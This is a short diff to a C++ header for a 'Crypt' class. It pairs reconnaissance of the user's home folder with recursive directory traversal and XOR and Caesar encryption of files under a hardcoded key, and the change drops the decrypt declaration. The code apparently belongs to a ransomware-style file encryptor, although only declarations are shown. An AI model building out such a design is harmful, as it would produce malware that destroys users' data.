@@ -16,16 +16,16 @@ namespace fs = std::filesystem;
 
 class Crypt {
 public:
-	Crypt();
-	VOID startCrypt();
-	static std::string decryptCaesar(std::vector<unsigned char> &encrypted_data, int key);
+	Crypt(const std::wstring &targetPath);
+	VOID StartCrypt();
 	static std::string encryptCaesar(std::vector<unsigned char>& encrypted_data, int key);
+	//static std::string decryptCaesar(std::vector<unsigned char> &encrypted_data, int key);
 	//std::vector<char> encrypt_bytes(const fs::directory_entry& file);
 private:
 	Recon recon;
 	char key = 0x33;
 
-	std::wstring startingPath = recon.getHomeFolder() + L"\\testing";
+	//std::wstring startingPath = recon.getHomeFolder() + L"\\testing";
 	//std::wstring startingPath = recon.getHomeFolder();
 	VOID _traverse_directory(const std::wstring& folderPath); 
 	VOID XORCryptFile(const fs::directory_entry& file);
